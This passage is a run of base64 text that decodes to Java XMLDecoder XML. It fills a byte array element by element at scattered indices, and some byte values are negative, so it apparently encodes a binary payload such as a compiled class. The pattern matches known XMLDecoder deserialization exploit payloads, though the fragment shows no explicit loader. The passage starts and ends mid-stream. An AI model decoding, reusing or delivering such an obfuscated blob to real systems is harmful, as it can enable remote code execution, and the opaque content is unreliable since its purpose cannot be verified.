SI+PGJ5dGU+MTA5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTYwNSI+PGJ5dGU+NDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzA4Ij48Ynl0ZT4xMDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5NyI+PGJ5dGU+NDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTk3Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU2NzMiPjxieXRlPjI2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTExIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjM0Ij48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMTUiPjxieXRlPjUwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDIxMiI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjcwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5NTYiPjxieXRlPjEwNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMzMjMiPjxieXRlPjUxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDEyMyI+PGJ5dGU+Njg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzY4Ij48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NDcxIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIwNDgiPjxieXRlPjQ5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI5NiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTM5MyI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MTI1Ij48Ynl0ZT45ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0NTkiPjxieXRlPjcxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTg0MCI+PGJ5dGU+LTczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc4MCI+PGJ5dGU+NDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDkyIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5OTMiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwNjciPjxieXRlPjEwOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3MiI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTE3Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNjcyIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTczIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTcxIj48Ynl0ZT44MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxNjgiPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNDciPjxieXRlPjExOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyNjIiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzU5MSI+PGJ5dGU+ODE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3NDUiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5MjAiPjxieXRlPjg2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDczNiI+PGJ5dGU+MTA2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDgwNiI+PGJ5dGU+MTA2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTIyIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODE5Ij48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODkwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxNjMiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTc2MiI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTk2MiI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUwNzQiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYxMDYiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ0NTIiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjc0OSI+PGJ5dGU+LTQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjYxIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyMDIiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ1NCI+PGJ5dGU+MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMyODMiPjxieXRlPjUwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTY0MCI+PGJ5dGU+OTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTcxIj48Ynl0ZT4xMDg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTkiPjxieXRlPjczPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDMzNSI+PGJ5dGU+MTAwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgyOCI+PGJ5dGU+MjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NjM3Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY0MyI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE2NSI+PGJ5dGU+MTEyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDM3MiI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg0OSI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2ODIzIj48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NDcxIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0NDkiPjxieXRlPjcyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE3MSI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTEzMiI+PGJ5dGU+MTAxPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTc0NCI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg1MiI+PGJ5dGU+NDc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMzgzIj48Ynl0ZT4xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjI4Ij48Ynl0ZT43ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NDciPjxieXRlPjY3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iODIzIj48Ynl0ZT4xMDA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2NzYzIj48Ynl0ZT4xMTY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTUzIj48Ynl0ZT4xMDQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MTAiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1OTUiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk1OSI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA3OCI+PGJ5dGU+MTA1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTMyNCI+PGJ5dGU+MTE0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzY0OCI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MDkiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTk0NSI+PGJ5dGU+MTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MjQxIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwOTIiPjxieXRlPjc0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzk5MCI+PGJ5dGU+NzQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjI4Ij48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MzIiPjxieXRlPjEwMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExNjAiPjxieXRlPjExNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijk5MSI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjgwNSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjE4Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijg0NSI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NTAiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTAyIj48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYwNjMiPjxieXRlPjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzUzIj48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0MDQiPjxieXRlPjEyMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU0NTYiPjxieXRlPjUyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTgyOSI+PGJ5dGU+NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyMjgiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI1NyI+PGJ5dGU+MTE3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDE5MyI+PGJ5dGU+NjY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMDk0Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTg1Ij48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwMTgiPjxieXRlPjg5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTE1NCI+PGJ5dGU+MTE4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjI4MCI+PGJ5dGU+Njk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI5ODIiPjxieXRlPjc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyOTIyIj48Ynl0ZT45MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI0NzgiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc0NCI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODUyIj48Ynl0ZT42NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5MTYiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyIj48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzODciPjxieXRlPjExMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0ODIiPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0NDAiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE4NSI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDgxMSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjU0NCI+PGJ5dGU+LTUzPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjY5Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2OTciPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMTEiPjxieXRlPjExOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzNiI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NzkyIj48Ynl0ZT4tOTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyNTk2Ij48Ynl0ZT44MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYzMDgiPjxieXRlPjk1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzg1NiI+PGJ5dGU+MTA3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTkyIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NjQxIj48Ynl0ZT4xMTg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjk4Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ1NjYiPjxieXRlPjEwNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2NjkiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDk3MCI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQ1OSI+PGJ5dGU+OTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMzU2Ij48Ynl0ZT44NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4MzMiPjxieXRlPjU0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTQ4OCI+PGJ5dGU+NTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjQyIj48Ynl0ZT41MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2ODMiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM0NDUiPjxieXRlPjU1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzA2OSI+PGJ5dGU+ODE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyODcyIj48Ynl0ZT43ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4Ij48Ynl0ZT4zMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1MDkiPjxieXRlPjExNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUxMTMiPjxieXRlPjg8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MTUwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY0NjgiPjxieXRlPjQ2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzIwOSI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzI5NSI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1ODQ0Ij48Ynl0ZT42PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjQ0Ij48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjY0Ij48Ynl0ZT45NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQ5OSI+PGJ5dGU+NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI4MDQiPjxieXRlPjY5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzM3NCI+PGJ5dGU+ODU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMDM2Ij48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY2MzgiPjxieXRlPjEwNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM2NjMiPjxieXRlPjY2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDQwNyI+PGJ5dGU+MTA4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTkxOCI+PGJ5dGU+MjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzg1Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExMyI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjQ5NCI+PGJ5dGU+NDY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNzk0Ij48Ynl0ZT43MjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUzMCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDYzNiI+PGJ5dGU+NTk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NzU2Ij48Ynl0ZT4zMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyNCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTUwMyI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzOTE4Ij48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzOTAiPjxieXRlPjkwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTc2NiI+PGJ5dGU+NDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1NzYiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTIxMyI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDkyMCI+PGJ5dGU+MTA0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjE2MiI+PGJ5dGU+OTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0Mjc3Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjU0MiI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzc5Ij48Ynl0ZT44NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQyMjQiPjxieXRlPjU2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMTg4NiI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIyMjciPjxieXRlPjY3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzgzNyI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1MzAwIj48Ynl0ZT4xMTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI3MDkiPjxieXRlPjEwMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxMTMiPjxieXRlPjEyMjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4NjAiPjxieXRlPjQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjQwIj48Ynl0ZT41NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNTciPjxieXRlPjEwOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjExODkiPjxieXRlPjEwOTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM1MjEiPjxieXRlPjg0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA0MyI+PGJ5dGU+MTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5MCI+PGJ5dGU+MTE2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE0MiI+PGJ5dGU+MzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwMTIiPjxieXRlPjcwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTI3Ij48Ynl0ZT4xMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI4NDIiPjxieXRlPjk4PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjIyOSI+PGJ5dGU+MjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNzAzIj48Ynl0ZT4xMDM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDQ4Ij48Ynl0ZT44OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI3NDciPjxieXRlPjg3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzE2NSI+PGJ5dGU+MTExPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTAyOCI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTA5NSI+PGJ5dGU+MTEwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDA4NSI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMjcwIj48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzNjIiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE0OTUiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM5MzMiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjUzMCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTY2Ij48Ynl0ZT4xNjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE5NjYiPjxieXRlPjg2PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY4OCI+PGJ5dGU+Nzc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxMjkiPjxieXRlPjExNTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY1ODQiPjxieXRlPjcyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjk2MiI+PGJ5dGU+ODk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTQzIj48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1MjkiPjxieXRlPjE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxOTUyIj48Ynl0ZT42OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwMDEiPjxieXRlPjEyMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE2NzkiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU3MjgiPjxieXRlPi0xMTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIxNTIxIj48Ynl0ZT4xMjA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMzYzIj48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQxOTQiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNzA1Ij48Ynl0ZT4xMTQ8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMTQ1Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE1MDIiPjxieXRlPjExMDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI2MDQiPjxieXRlPjEwNDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIzMzYiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEzNDYiPjxieXRlPjk1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNTEiPjxieXRlPjExNzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjE3NzYiPjxieXRlPjU0PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDUyNCI+PGJ5dGU+MTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0OSI+PGJ5dGU+OTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNjQ0Ij48Ynl0ZT42NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9Ijc1MyI+PGJ5dGU+MTE1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOTMxIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0MDAzIj48Ynl0ZT42NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM4NjciPjxieXRlPjEwMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjYxNjgiPjxieXRlPjk1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjY5MiI+PGJ5dGU+NzY8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTk3Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzAzIj48Ynl0ZT4xMDE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNjc0Ij48Ynl0ZT42NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjU4NDkiPjxieXRlPjI1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjAxNiI+PGJ5dGU+ODE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MjAxIj48Ynl0ZT4xMDU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzMDIyIj48Ynl0ZT43NjwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjY3NzYiPjxieXRlPjEwODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjM3NDkiPjxieXRlPjY1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjc1NSI+PGJ5dGU+NzE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2MzI4Ij48Ynl0ZT4xPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNDI0NCI+PGJ5dGU+NjU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI0NTcwIj48Ynl0ZT40NzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjUyNzAiPjxieXRlPjQ3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc5MSI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2ODMzIj48Ynl0ZT4xMTU8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI1NTIxIj48Ynl0ZT4yPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjE3MiI+PGJ5dGU+NTc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4NjAiPjxieXRlPjk5PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzYwNSI+PGJ5dGU+MTIwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNjA5MCI+PGJ5dGU+Njc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNTUzIj48Ynl0ZT4xMTA8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI4NDYiPjxieXRlPjExMTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEyOTEiPjxieXRlPjcyPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjkxMSI+PGJ5dGU+ODc8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzNDk4Ij48Ynl0ZT45OTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjI5NDUiPjxieXRlPjExMzwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjIxNDIiPjxieXRlPjk3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMjk5Ij48Ynl0ZT45NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjMwNzIiPjxieXRlPjU3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMzc2NCI+PGJ5dGU+MT